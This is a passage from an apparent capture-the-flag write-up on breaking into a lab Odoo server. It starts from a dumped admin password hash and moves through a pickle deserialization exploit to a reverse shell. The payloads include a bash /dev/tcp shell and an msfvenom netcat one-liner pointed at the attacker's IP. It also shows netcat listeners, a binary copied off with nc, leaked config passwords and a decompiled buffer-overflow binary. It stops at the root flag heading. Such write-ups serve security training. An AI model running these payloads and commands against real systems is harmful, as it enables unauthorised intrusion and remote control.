3       Administrator   1       \N      \N      \N      2022-07-23 10:51:25.449364      0       t       \N      \N      Administrator   \N      \N      \N      \N      \N      \Nf       \N      admin@antisoft.thm      f       \N      en_US   \N      \N      \N      f       2022-07-23 10:52:10.087949      \N      \N      1       f       1       \N      \N\N      contact f       \N      \N      3
1       t       admin@antisoft.thm              1       3       \N      f       1       \N      \N      2022-07-23 10:52:10.087949      <span data-o-mail-quote="1">-- <br data-o-mail-quote="1">\nAdministrator</span>   $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag
```

Found credentials:
- Username: admin@antisoft.thm
- Password Hash: $pbkdf2-sha512$12000$lBJiDGHMOcc4Zwwh5Dzn/A$x.EZ/PrEodzEJ5r4JfQo2KsMZLkLT97xWZ3LsMdgwMuK1Ue.YCzfElODfWEGUOc7yYBB4fMt87ph8Sy5tN4nag

Trying to login as admin with the master password
![[Pasted image 20230507034839.png]]
Success!

http://10.10.34.131/web#view_type=kanban&model=ir.module.module&menu_id=69&action=37
![[Pasted image 20230507035020.png]]
http://10.10.34.131/web#menu_id=52&action=76
![[Pasted image 20230507035528.png]]

After clicking around, Odoo has barely been installed, no apps added, just the admin account.
Lets look for vulnerabilities.

![[Pasted image 20230507035803.png]]

https://www.exploit-db.com/exploits/44064

We install the "Database Anonymization" app and configure it to Anonymize
![[Pasted image 20230507041403.png]]

Then I created an exploit.py to create the exploit.pickle payload 

```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("bash -i >& /dev/tcp/10.10.128.178/4444 0>&1"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

```bash
┌──(root㉿kali)-[~/Downloads]
└─# python --version 
Python 3.10.7

┌──(root㉿kali)-[~/Downloads]
└─# python2 --version
Python 2.7.18

┌──(root㉿kali)-[~/Downloads]
└─# python2 exploit.py

┌──(root㉿kali)-[~/Downloads]
└─# ls
44064.md  exploit.pickle  main_2023-05-07_08-21-52      notice.txt
50101.py  exploit.py      main_2023-05-07_08-21-52.zip  password
```

and opened a listener
```bash
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444 
listening on [any] 4444 ...

```

Upload the exploit.pickle to the anonymizer
![[Pasted image 20230507042033.png]]

Then we "Reverse the Database Anonymization" ... but it just didn't work for me. So back to looking ... I feel we are close.

![[Pasted image 20230507043855.png]]

After trying dozens of pretty random things, I decided to try changing the reverse shell command

```bash
┌──(root㉿kali)-[~]
└─# msfvenom -p cmd/unix/reverse_netcat lhost=10.10.128.178 lport=4444 R
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 99 bytes
mkfifo /tmp/fxyiqf; nc 10.10.128.178 4444 0</tmp/fxyiqf | /bin/sh >/tmp/fxyiqf 2>&1; rm /tmp/fxyiqf
```


```python
import cPickle
import os
import base64
import pickletools

class Exploit(object):
  def __reduce__(self):
    return (os.system, (("mkfifo /tmp/fxyiqf; nc 10.10.128.178 4444 0</tmp/fxyiqf | /bin/sh >/tmp/fxyiqf 2>&1; rm /tmp/fxyiqf"),))

with open("exploit.pickle", "wb") as f:
  cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

![[Pasted image 20230507045451.png]]

Scottie, we have us a reverse shell!


## Answer the questions below

### What's the initial flag?

```bash
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.128.178] from (UNKNOWN) [10.10.34.131] 57846
whoami
odoo
id
uid=105(odoo) gid=109(odoo) groups=109(odoo)
cd ~
pwd
/var/lib/odoo
ls
addons
field_anonymization_main_1.pickle
filestore
flag.txt
sessions
cat flag.txt
THM{**************************}
```

### What's the user flag?

Now we need to find additional credentials or escalate.

```bash
Shell Stabilization
1. python -c 'import pty;pty.spawn("/bin/bash")'
2. export TERM=xterm
3. Background the shell using Ctrl + Z. 
4. stty raw -echo; fg


odoo@b8a9bbf1f380:~$ pwd
/var/lib/odoo
odoo@b8a9bbf1f380:~$ whoami
odoo
odoo@b8a9bbf1f380:~$ id
uid=105(odoo) gid=109(odoo) groups=109(odoo)
odoo@b8a9bbf1f380:~$ uname -a
Linux b8a9bbf1f380 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 GNU/Linux
odoo@b8a9bbf1f380:~$ cat /proc/version
Linux version 4.4.0-210-generic (buildd@lgw01-amd64-009) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12) ) #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021
odoo@b8a9bbf1f380:~$ env
DB_ENV_POSTGRES_USER=odoo
DB_ENV_PGDATA=/var/lib/postgresql/data
HOSTNAME=b8a9bbf1f380
DB_NAME=/unkkuri-odoo/db
TERM=xterm
DB_PORT_5432_TCP_ADDR=172.17.0.2
DB_PORT=tcp://172.17.0.2:5432
DB_ENV_POSTGRES_PASSWORD=unkkuri-secret-pw
DB_ENV_LANG=en_US.utf8
DB_ENV_GOSU_VERSION=1.11
DB_PORT_5432_TCP=tcp://172.17.0.2:5432
ODOO_RC=/etc/odoo/odoo.conf
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DB_ENV_PG_MAJOR=9.4
PWD=/var/lib/odoo
TZ=UTC
DB_PORT_5432_TCP_PORT=5432
HOME=/var/lib/odoo
SHLVL=1
DB_PORT_5432_TCP_PROTO=tcp
DB_ENV_PG_VERSION=9.4.26-1.pgdg90+1
ODOO_VERSION=10.0
_=/usr/bin/env
OLDPWD=/home

odoo@b8a9bbf1f380:~$ cat /etc/odoo/odoo.conf
[options]
addons_path = /mnt/extra-addons,/usr/lib/python2.7/dist-packages/odoo/addons
admin_passwd = SecurePassword123!
csv_internal_sep = ,
data_dir = /var/lib/odoo
db_host = 172.17.0.2
db_maxconn = 64
db_name = False
db_password = unkkuri-secret-pw
db_port = 5432
db_template = template1
db_user = odoo
<SNIP>

odoo@b8a9bbf1f380:~$ sudo -l
bash: sudo: command not found

odoo@b8a9bbf1f380:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
dirmngr:x:104:107::/var/cache/dirmngr:/bin/sh
odoo:x:105:109::/var/lib/odoo:/bin/false

doo@b8a9bbf1f380:~$ find / -name *.txt 2>/dev/null
/var/lib/odoo/flag.txt
odoo@b8a9bbf1f380:~$ 
```

So at this point I've collected a couple things, but its clear I need to escalate. Odoo is very limited.

Lets search for SUID bits https://gtfobins.github.io/
```bash
odoo@b8a9bbf1f380:~$ find / -perm -u=s -type f 2>/dev/null 
/bin/mount
/bin/umount
/bin/ping
/bin/ping6
/bin/su
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/ret
```

/ret looks interesting and is not OOTB

```bash
odoo@b8a9bbf1f380:~$ ls /ret -al
-rwsr-xr-x 1 root root 8864 Jul 23  2022 /ret
odoo@b8a9bbf1f380:~$ /ret
Exploit this binary to get on the box!
What do you have for me?
odoo
```

Could use "strings ret", so I manually pulled strings from the binary
```bash
odoo@b8a9bbf1f380:/$ cat ret
ELF>
/lib64/ld-linux-x86-64.so.2GNU GNU
libc.so.6getsfflushstdoutsystemfwrite__libc_start_main__gmon_start__GLIBC_2.2.5u
AWAVA AUATL
congrats, you made it on the box
/bin/sh
Exploit this binary to get on the box!
What do you have for me?
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
```

Some insteresting strings, but not enough. Lets move it to Kali to analyze better.

On the receiving end running,

```
nc -l -p 1234 > out.file
```

will begin listening on port 1234.

On the sending end running,

```
nc -w 3 [destination] 1234 < out.file
```

On the Odoo box

```bash
odoo@b8a9bbf1f380:/$ /ret ls
Exploit this binary to get on the box!
What do you have for me?
ls
odoo@b8a9bbf1f380:/$ nc -w 3 10.10.128.178 1234 < ret
```

On the Kali Attack Box

```bash
┌──(root㉿kali)-[~/Downloads]
└─# nc -l -p 1234 > out.file

┌──(root㉿kali)-[~/Downloads]
└─# file out.file
out.file: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3c3a9e9f974de13925f0644178007bdbf22576e3, not stripped

┌──(root㉿kali)-[~/Downloads]
└─# strings out.file     
/lib64/ld-linux-x86-64.so.2
libc.so.6
gets
fflush
stdout
system
fwrite
__libc_start_main
__gmon_start__
GLIBC_2.2.5
UH-P
AWAVA
AUATL
[]A\A]A^A_
congrats, you made it on the box
/bin/sh
Exploit this binary to get on the box!
What do you have for me?
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7594
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
ret2win.c
<SNIP>
```

Honesltly, I dont see anything except "congrats.." as a new string.  Lets decompile this in Ghidra.

![[Pasted image 20230507060537.png]]

After loading the file in Ghidra nd looking at the Symbol tree and navigating functions and structures. 

![[Pasted image 20230507061549.png]]

I found the following relevant code:

```c
undefined8 main(void)
{
  vuln();
  return 0;
}

void vuln(void)
{
  char local_88 [128];
  
  fwrite("Exploit this binary to get on the box!\nWhat do you have for me?\n",1,0x40,stdout);
  fflush(stdout);
  gets(local_88);
  return;
}
void win(void)

{
  fwrite("congrats, you made it on the box",1,0x20,stdout);
  system("/bin/sh");
  return;
}
```

Based on this code, I surmise that we need to invoke a buffer overflow.
Main calls vuln()
Nothing seems to be calling win(), yet this function spawn a shell.
Therefore, I believe that we need to use the binary invoke the win() function. 

![[Pasted image 20230507063034.png]]


### What's the root flag?

